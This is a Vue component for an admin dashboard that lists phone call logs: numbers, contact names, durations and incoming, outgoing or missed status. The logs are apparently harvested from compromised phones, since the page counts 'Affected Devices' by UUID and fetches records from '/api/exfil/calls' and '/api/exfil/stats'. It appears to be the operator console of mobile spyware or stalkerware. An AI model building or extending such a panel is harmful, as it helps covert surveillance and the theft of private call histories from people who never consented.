<template>
  <div class="calls">
    <!-- Stats -->
    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><Phone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.by_category?.calls || 0 }}</div>
              <div class="stat-label">Total Calls</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #e6a23c;">
              <el-icon size="28"><Iphone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.devices || 0 }}</div>
              <div class="stat-label">Affected Devices</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><ArrowDown /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ incomingCount }}</div>
              <div class="stat-label">Incoming</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><ArrowUp /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ outgoingCount }}</div>
              <div class="stat-label">Outgoing</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <!-- Toolbar -->
    <el-card>
      <div class="toolbar">
        <div class="search-bar">
          <el-input v-model="filters.device_uuid" placeholder="Device UUID" style="width: 250px;" />
          <el-input v-model="filters.phone" placeholder="Number" style="width: 150px;" />
          <el-select v-model="filters.type" placeholder="Type">
            <el-option label="All" value="" />
            <el-option label="Incoming" value="incoming" />
            <el-option label="Outgoing" value="outgoing" />
            <el-option label="Missed" value="missed" />
          </el-select>
          <el-button type="primary" @click="loadCalls">Search</el-button>
          <el-button @click="resetFilters">Reset</el-button>
        </div>
      </div>
      
      <el-table :data="callsData" border v-loading="loading">
        <el-table-column prop="id" label="ID" width="80" />
        <el-table-column prop="device_uuid" label="Device UUID" width="250" show-overflow-tooltip />
        <el-table-column prop="phone" label="Number" />
        <el-table-column prop="name" label="Name" />
        <el-table-column prop="duration" label="Duration (s)" width="100" />
        <el-table-column prop="type" label="Type" width="100">
          <template #default="scope">
            <el-tag :type="getCallType(scope.row.type)">{{ getCallTypeName(scope.row.type) }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="created_at" label="Time" width="180" />
        <el-table-column label="Actions" width="100">
          <template #default="scope">
            <el-button size="small" type="danger" @click="deleteItem(scope.row.id)">Delete</el-button>
          </template>
        </el-table-column>
      </el-table>
      
      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted, computed } from 'vue'
import axios from '../utils/axios'
import { Phone, Iphone, ArrowDown, ArrowUp } from '@element-plus/icons-vue'

const callsData = ref([])
const loading = ref(false)
const stats = ref({})

const filters = reactive({
  device_uuid: '',
  phone: '',
  type: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

const incomingCount = computed(() => callsData.value.filter(item => item.type === 'incoming').length)
const outgoingCount = computed(() => callsData.value.filter(item => item.type === 'outgoing').length)

function getCallType(type) {
  const types = { 'incoming': 'success', 'outgoing': 'info', 'missed': 'danger' }
  return types[type] || 'info'
}

function getCallTypeName(type) {
  const names = { 'incoming': 'Incoming', 'outgoing': 'Outgoing', 'missed': 'Missed' }
  return names[type] || type
}

async function loadStats() {
  try {
    const response = await axios.get('/api/exfil/stats')
    stats.value = response.data
  } catch (error) {
    console.error('Failed to load stats:', error)
  }
}

async function loadCalls() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.phone) params.append('phone', filters.phone)
    if (filters.type) params.append('type', filters.type)
    
    const response = await axios.get(`/api/exfil/calls?${params}`)
    callsData.value = response.data
  } catch (error) {
    console.error('Failed to load data:', error)
  } finally {
    loading.value = false
  }
}

async function deleteItem(id) {
  if (!confirm('Delete this record?')) return
  try {
    await axios.delete(`/api/exfil/${id}`)
    loadCalls()
    loadStats()
  } catch (error) {
    console.error('Delete failed:', error)
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.phone = ''
  filters.type = ''
  loadCalls()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadCalls()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadCalls()
}

onMounted(() => {
  loadStats()
  loadCalls()
})
</script>

<style scoped>
.stats-row {
  margin-bottom: 15px;
}

.stat-card {
  display: flex;
  align-items: center;
  gap: 15px;
}

.stat-icon {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: bold;
  color: #333;
}

.stat-label {
  font-size: 14px;
  color: #999;
  margin-top: 5px;
}

.toolbar {
  margin-bottom: 15px;
}

.search-bar {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}
</style>